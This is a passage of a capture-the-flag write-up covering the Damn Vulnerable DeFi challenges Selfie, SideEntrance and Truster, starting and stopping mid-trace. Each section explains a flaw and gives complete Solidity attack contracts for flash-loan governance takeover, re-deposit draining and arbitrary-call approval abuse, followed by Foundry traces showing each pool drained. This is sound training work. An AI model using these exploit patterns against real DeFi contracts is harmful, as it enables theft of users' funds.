    <span class="s">├─ [825] WETH::balanceOf(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertEq(0, 0, "Unexpected balance in pool") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [825] WETH::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 1010000000000000000000 [1.01e21]</span>
    <span class="s">├─ [0] VM::assertEq(1010000000000000000000 [1.01e21], 1010000000000000000000 [1.01e21], "Not enough WETH in recovery account") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 41.39ms (13.88ms CPU time)</span>

</code></pre></div></div>

<hr />

<h2 id="selfie-challenge">Selfie Challenge</h2>

<h3 id="challenge-overview-4">Challenge Overview:</h3>
<p>A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.</p>

<p>What could go wrong, right ?</p>

<p>You start with no DVT tokens in balance, and the pool has 1.5 million at risk.</p>

<p>Rescue all funds from the pool and deposit them into the designated recovery account.</p>

<p><strong>Simple to understand</strong>:
Exploit a governance system that relies on a snapshot-based token voting mechanism to drain all tokens from the SelfiePool contract.</p>

<p><strong><em>Contracts in this Challenge</em></strong>:</p>

<ol>
  <li>
    <p>DamnValuableVotes (ERC20Votes): ERC20 token with snapshot-based voting power (uses OpenZeppelin’s ERC20Votes).</p>
  </li>
  <li>
    <p>SimpleGovernance: Contract allowing proposals to be queued and executed after a time delay, based on token voting power at the time of queueAction.</p>
  </li>
  <li>
    <p>SelfiePool: A pool that offers ERC3156 flash loans and has emergencyExit(address) function that can be executed by governance.</p>
  </li>
</ol>

<h3 id="vulnerability">Vulnerability:</h3>

<p>The governance system uses snapshot-based voting power, and the snapshot is taken when the queueAction() is called.</p>

<ol>
  <li>
    <p>A user can take a flash loan, temporarily gaining a large amount of governance tokens.</p>
  </li>
  <li>
    <p>During the loan, they delegate votes to themselves and queue a governance action.</p>
  </li>
  <li>
    <p>After the snapshot is taken and the loan is repaid, the user can still execute the queued action after the delay, even though they no longer have the tokens.</p>
  </li>
</ol>

<p>This allows a user to queue a malicious action with temporary voting power gained via flash loan.</p>

<p><strong>VulnerableFunction</strong>:</p>
<pre><code class="language-solidity">function queueAction(address target, uint256 value, bytes calldata data) external returns (uint256 actionId)//when call this function u must have half of the tokens,once u get the power,can make the changes in the contract

</code></pre>

<ol>
  <li>Requires the caller to have enough voting power (from snapshot) to queue.</li>
</ol>

<pre><code class="language-solidity">      //once u have the enough tokens u can get the power,tokens comes from via flashloan
      // u can delegate the token to the pool and get the voting power
        token.delegate(address(this));//this delegate function used to access the power once u have enough tokens
        //after delegate we can call the queueAction function 
</code></pre>

<ol>
  <li>Doesn’t check token balance now, only the balance at snapshot.</li>
</ol>

<h3 id="exploit-strategy-3">Exploit Strategy:</h3>

<ol>
  <li>Deploy a malicious contract (SelfieAttack).</li>
  <li>Take a flash loan of all tokens from the pool.</li>
  <li>Delegate the borrowed tokens’ votes to the attack contract.</li>
  <li>Queue a governance action:
    <pre><code class="language-solidity">pool.emergencyExit(attackerAddress)
</code></pre>
  </li>
  <li>Repay the flash loan.</li>
  <li>Wait for the governance delay (2 days).</li>
  <li>Execute the queued malicious proposal.</li>
</ol>

<h3 id="proof-of-code">Proof Of Code:</h3>
<p><em>**observe this challenge ,exploit using single transation **</em></p>
<pre><code class="language-solidity">//this is the function where i can solve the challenge Damn-Defi-v4-selfie
function test_selfie() public checkSolvedByPlayer {
        SelfieAttack attack = new SelfieAttack(
            recovery,
            address(pool),
            address(governance),
            address(token)
        );
        attack.attack();
        // The attack contract will take a flash loan, delegate the voting power to itself,
        // queue an action to emergency exit the pool, and execute it after the delay.
        // The action will transfer all tokens from the pool to the recovery address.
    }
//SelfieAttack contract which is used to exploit the code
contract SelfieAttack is IERC3156FlashBorrower, Test {
    address public player;
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableVotes public token;
    uint public actionId;
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _player,
        address _pool,
        address _governance,
        address _token
    ) {
        pool = SelfiePool(_pool);
        player = _player;
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
    }

    function attack() external {
        SelfiePool(pool).flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            SelfiePool(pool).maxFlashLoan(address(token)),
            ""
        );
        // Execute the action after the delay
        vm.warp(block.timestamp + governance.getActionDelay());
        governance.executeAction(actionId);
    }

    function onFlashLoan(
        address _initiator, //who will call this function,
        address, // address of the token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata //bytes for callback function
    ) external returns (bytes32) {
        require(msg.sender == address(pool), "Only pool can call");
        require(_initiator == address(this), " Initiator is not self");

        // u can delegate the token to the pool and get the voting power
        token.delegate(address(this));
        uint _actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", player)
        );

        actionId = _actionId;
        token.approve(address(pool), _amount + _fee); //approve the pool to withdraw the tokens
        return CALLBACK_SUCCESS;
    }
}

</code></pre>

<h3 id="proof-of-exploit-4">Proof Of Exploit:</h3>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Drain all the funds from Dex contract and send to to the recovery through attacker</span>
<span class="s">nithin@ScateR:~/SCATERLABs/CTFs/Dam-vulnerable-Defi$ forge test --match-test test_selfie -vvvv</span>
<span class="pi">[</span><span class="nv">⠒</span><span class="pi">]</span> <span class="s">Compiling...</span>
<span class="pi">[</span><span class="nv">⠒</span><span class="pi">]</span> <span class="s">Compiling 1 files with Solc 0.8.25</span>
<span class="pi">[</span><span class="nv">⠆</span><span class="pi">]</span> <span class="s">Solc 0.8.25 finished in 1.97s</span>
<span class="s">Compiler run successful!</span>

<span class="s">Ran 1 test for test/selfie/Selfie.t.sol:SelfieChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_selfie() (gas</span><span class="pi">:</span> <span class="s">2400285)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">2450485</span><span class="pi">]</span> <span class="s">SelfieChallenge::test_selfie()</span>
    <span class="s">├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [2027380] → new SelfieAttack@0xce110ab5927CC46905460D930CCa0c6fB4666219</span>
    <span class="s">│   └─ ← [Return] 9566 bytes of code</span>
    <span class="s">├─ [367082] SelfieAttack::attack()</span>
    <span class="s">│   ├─ [6747] SelfiePool::maxFlashLoan(DamnValuableVotes: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]) [staticcall]</span>
    <span class="s">│   │   ├─ [2852] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]</span>
    <span class="s">│   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]</span>
    <span class="s">│   ├─ [309199] SelfiePool::flashLoan(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], DamnValuableVotes</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">1500000000000000000000000 [1.5e24], 0x)</span>
    <span class="s">│   │   ├─ [33377] DamnValuableVotes::transfer(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   ├─ emit Transfer(from</span><span class="na">: SelfiePool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [255171] SelfieAttack::onFlashLoan(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], DamnValuableVotes</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">1500000000000000000000000 [1.5e24], 0, 0x)</span>
    <span class="s">│   │   │   ├─ [71415] DamnValuableVotes::delegate(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219])</span>
    <span class="s">│   │   │   │   ├─ emit DelegateChanged(delegator</span><span class="na">: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">fromDelegate</span><span class="pi">:</span> <span class="s">0x0000000000000000000000000000000000000000, toDelegate</span><span class="na">: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   │   │   │   ├─ emit DelegateVotesChanged(delegate</span><span class="na">: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">previousVotes</span><span class="pi">:</span> <span class="s">0, newVotes</span><span class="err">:</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [128147] SimpleGovernance::queueAction(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 0, 0xa441d06700000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea)</span>
    <span class="s">│   │   │   │   ├─ [1438] DamnValuableVotes::getVotes(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219]) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]</span>
    <span class="s">│   │   │   │   ├─ [2500] DamnValuableVotes::totalSupply() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 2000000000000000000000000 [2e24]</span>
    <span class="s">│   │   │   │   ├─ emit ActionQueued(actionId</span><span class="err">:</span> <span class="s">1, caller</span><span class="na">: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="m">1</span>
    <span class="s">│   │   │   ├─ [25321] DamnValuableVotes::approve(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   │   ├─ emit Approval(owner</span><span class="na">: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: SelfiePool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   ├─ [10856] DamnValuableVotes::transferFrom(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], SelfiePool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="na">│   │   │   ├─ emit Transfer(from: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: SelfiePool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="na">│   │   │   ├─ emit DelegateVotesChanged(delegate: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">previousVotes</span><span class="pi">:</span> <span class="s">1500000000000000000000000 [1.5e24], newVotes</span><span class="err">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   ├─ [310] SimpleGovernance::getActionDelay() [staticcall]</span>
    <span class="s">│   │   └─ ← [Return] 172800 [1.728e5]</span>
    <span class="s">│   ├─ [0] VM::warp(172801 [1.728e5])</span>
    <span class="s">│   │   └─ ← [Return]</span>
    <span class="s">│   ├─ [42855] SimpleGovernance::executeAction(1)</span>
    <span class="na">│   │   ├─ emit ActionExecuted(actionId</span><span class="pi">:</span> <span class="s">1, caller</span><span class="na">: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   │   ├─ [35828] SelfiePool::emergencyExit(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa])</span>
    <span class="s">│   │   │   ├─ [852] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]</span>
    <span class="s">│   │   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]</span>
    <span class="s">│   │   │   ├─ [31377] DamnValuableVotes::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1500000000000000000000000 [1.5e24])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: SelfiePool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recovery</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x73030B99950fB19C6A813465E58A0BcA5487FBEa</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="na">│   │   │   ├─ emit EmergencyExit(receiver: recovery</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x73030B99950fB19C6A813465E58A0BcA5487FBEa</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   └─ ← [Return] 0x</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::stopPrank()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [852] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [852] DamnValuableVotes::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 1500000000000000000000000 [1.5e24]</span>
    <span class="s">├─ [0] VM::assertEq(1500000000000000000000000 [1.5e24], 1500000000000000000000000 [1.5e24], "Not enough tokens in recovery account") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 5.62ms (2.40ms CPU time)</span>
</code></pre></div></div>

<hr />

<h2 id="sideentrance-challenge">SideEntrance challenge</h2>

<h2 id="challenge-overview-5">Challenge Overview:</h2>
<p>A deceptively simple lending pool allows anyone to:</p>

<ul>
  <li>Deposit ETH.</li>
  <li>Withdraw ETH at any time.</li>
  <li>Take out flash loans with <strong>zero fees</strong> using <strong>deposited ETH</strong>.</li>
</ul>

<blockquote>
  <p>The pool already contains <strong>1000 ETH</strong>, and your account starts with just <strong>1 ETH</strong>.
 Your goal is to <strong>drain all ETH from the pool and deposit it into the provided recovery address</strong>.</p>
</blockquote>

<h2 id="vulnerability-explanation-2">Vulnerability Explanation:</h2>

<p>The contract logic enables an attacker to:</p>

<ol>
  <li><strong>Borrow ETH</strong> through the <code class="language-plaintext highlighter-rouge">flashLoan</code> function.</li>
  <li>Within the <code class="language-plaintext highlighter-rouge">execute()</code> callback (called during the flash loan), <strong>re-deposit</strong> the same borrowed ETH using <code class="language-plaintext highlighter-rouge">deposit()</code>.</li>
  <li>This <strong>satisfies the flash loan repayment check</strong>, even though the attacker still “owns” the deposited ETH via their internal balance.</li>
  <li>After the loan, the attacker calls <code class="language-plaintext highlighter-rouge">withdraw()</code> to <strong>withdraw the same ETH</strong> as if it were theirs.</li>
  <li>Funds are transferred to the attacker and then <strong>forwarded to the recovery account</strong> via the <code class="language-plaintext highlighter-rouge">receive()</code> function.</li>
</ol>

<p>This exploit works because the pool <strong>does not differentiate</strong> between repaying a flash loan and depositing user funds.</p>

<h2 id="vulnerable-code-2">Vulnerable Code:</h2>

<pre><code class="language-solidity">function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();// first this function

        if (address(this).balance &lt; balanceBefore) {
            revert RepayFailed();
        }
    }
    //second withdraw function:
    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount); //it looks like call function and  no calldata==&gt;go to the recevier function 
    }

</code></pre>

<h2 id="exploiter-strategy-1">Exploiter Strategy:</h2>

<p>1.Deploy an attacker contract with access to the pool and recovery address.</p>

<p>2.Call flashLoan() to borrow the full balance.</p>

<p>3.In execute(), re-deposit the borrowed ETH back into the pool.</p>

<p>4.The loan is considered repaid due to the balance check.</p>

<p>5.Call withdraw() to drain the ETH.</p>

<p>When ETH is sent via .call, receive() forwards all funds to the recovery account.</p>

<h3 id="exploit-code-3">Exploit Code:</h3>
<pre><code class="language-solidity">// call the attacker contract
function test_sideEntrance() public checkSolvedByPlayer {
        SideAttranceAttack attack = new SideAttranceAttack(
            address(pool),
            recovery
        );
        attack.Attack();
    }


//Attacker Contract
contract SideAttranceAttack {
    address public pool;
    address public recovery;

    constructor(address _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function Attack() external {
        SideEntranceLenderPool(pool).flashLoan(address(pool).balance);//borrower initating falshLoan
        SideEntranceLenderPool(pool).withdraw(); //after the flashLoan,withdraw all the ether in the pool --&gt;recovery Account
    }

    
    function execute() external payable {
        SideEntranceLenderPool(pool).deposit{value: msg.value}();// deposit back to the pool through deposit function
    }

    receive() external payable {
        payable(recovery).transfer(msg.value);//transfer to the recovery Account
    }
}
</code></pre>
<h3 id="proof-of-exploit-5">Proof Of Exploit:</h3>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">Ran 1 test for test/side-entrance/SideEntrance.t.sol:SideEntranceChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_sideEntrance() (gas</span><span class="pi">:</span> <span class="s">347842)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">367742</span><span class="pi">]</span> <span class="s">SideEntranceChallenge::test_sideEntrance()</span>
    <span class="s">├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [235535] → new SideAttranceAttack@0xce110ab5927CC46905460D930CCa0c6fB4666219</span>
    <span class="s">│   └─ ← [Return] 952 bytes of code</span>
    <span class="s">├─ [86321] SideAttranceAttack::Attack()</span>
    <span class="s">│   ├─ [38751] SideEntranceLenderPool::flashLoan(1000000000000000000000 [1e21])</span>
    <span class="s">│   │   ├─ [31244] SideAttranceAttack::execute{value: 1000000000000000000000}()</span>
    <span class="s">│   │   │   ├─ [23951] SideEntranceLenderPool::deposit{value: 1000000000000000000000}()</span>
    <span class="s">│   │   │   │   ├─ emit Deposit(who</span><span class="na">: SideAttranceAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000000 [1e21])</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   ├─ [43561] SideEntranceLenderPool::withdraw()</span>
    <span class="s">│   │   ├─ emit Withdraw(who</span><span class="na">: SideAttranceAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000000 [1e21])</span>
    <span class="s">│   │   ├─ [34590] SideAttranceAttack::receive{value: 1000000000000000000000}()</span>
    <span class="s">│   │   │   ├─ [0] recovery::fallback{value: 1000000000000000000000}()</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::stopPrank()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::assertEq(0, 0, "Pool still has ETH") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "Not enough ETH in recovery account") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 5.78ms (757.72µs CPU time)</span>

<span class="na">Ran 1 test suite in 1.61s (5.78ms CPU time)</span><span class="pi">:</span> <span class="s">1 tests passed, 0 failed, 0 skipped (1 total tests)</span>

<span class="na">Simple Understanding Case</span><span class="pi">:</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_sideEntrance() (gas</span><span class="pi">:</span> <span class="s">347842)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="s">SideAttranceAttack::Attack()</span>
    <span class="s">├─ flashLoan(1000 ETH)</span>
    <span class="s">│   └─ execute{value</span><span class="err">:</span> <span class="s">1000 ETH} → deposit()</span>
    <span class="s">└─ withdraw() → receive() → forward to recovery</span> 

<span class="s">assertEq(Pool.balance, 0)</span> 
<span class="s">assertEq(Recovery.balance, 1000 ETH)</span> 
</code></pre></div></div>

<hr />

<h1 id="truster-challenge">Truster Challenge</h1>

<h3 id="challenge">Challenge:</h3>
<p>More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.</p>

<p>The pool holds 1 million DVT tokens. You have nothing.</p>

<p>To pass this challenge, <strong>rescue all funds in the pool executing a single transaction</strong>. Deposit the funds into the designated recovery account.</p>

<h4 id="smart-contract-">Smart Contract :</h4>
<p>TrusterLender Pool: Offering flash loans of DVT tokens for free</p>

<h3 id="vulnerability-explained">Vulnerability Explained:</h3>

<p>In this Pool, the flash loan function is calling <code class="language-plaintext highlighter-rouge">target.functionCall(data)</code> in a low-level manner. The function call uses data that can be manipulated by an attacker to drain all the funds.</p>

<h3 id="vulnerable-code-3">Vulnerable Code:</h3>
<pre><code class="language-solidity">function flashLoan(
    uint256 amount,
    address borrower,
    address target,
    bytes calldata data
) external nonReentrant returns (bool) {
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data); // Vulnerable is here, I smell it

    if (token.balanceOf(address(this)) &lt; balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
</code></pre>
<h3 id="exploit-strategy-4">Exploit strategy:</h3>
<p>The attack strategy involves calling the approve function to grant the attacker permission to withdraw all tokens from the pool. The data is crafted using abi.encodeWithSignature(“approve(address,uint256)”, address(this), TOKENS_IN_POOL), which approves the attacker to transfer all the tokens from the pool. After approval, the attacker uses transferFrom to move the tokens to the recovery account.</p>

<h3 id="exploit-code-4">Exploit Code:</h3>
<pre><code class="language-solidity">function test_truster() public checkSolvedByPlayer {
    new TrusterExploiter(pool, token, recovery, TOKENS_IN_POOL);
}

// Exploiter Contract:
contract TrusterExploiter {
    constructor(
        TrusterLenderPool pool,
        DamnValuableToken token,
        address recovery,
        uint256 TOKENS_IN_POOL
    ) {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            TOKENS_IN_POOL
        );
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}

</code></pre>
<h3 id="proof-of-exploit-6">Proof of Exploit:</h3>
<p>Check that the test case can easily understand the exploit:</p>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">Ran 1 test for test/truster/Truster.t.sol:TrusterChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_truster() (gas</span><span class="pi">:</span> <span class="s">112277)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">139777</span><span class="pi">]</span> <span class="s">TrusterChallenge::test_truster()</span>
    <span class="s">├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [86541] → new TrusterExploiter@0xce110ab5927CC46905460D930CCa0c6fB4666219</span>
    <span class="s">│   ├─ [46555] TrusterLenderPool::flashLoan(0, TrusterExploiter</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">DamnValuableToken</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0x095ea7b3000000000000000000000000ce110ab5927cc46905460d930cca0c6fb466621900000000000000000000000000000000000000000000d3c21bcecceda1000000)</span>
    <span class="s">│   │   ├─ [2802] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]</span>
    <span class="s">│   │   ├─ [5651] DamnValuableToken::transfer(TrusterExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0)</span>
    <span class="s">│   │   │   ├─ emit Transfer(from</span><span class="na">: TrusterLenderPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: TrusterExploiter</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [25079] DamnValuableToken::approve(TrusterExploiter: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1000000000000000000000000 [1e24])</span>
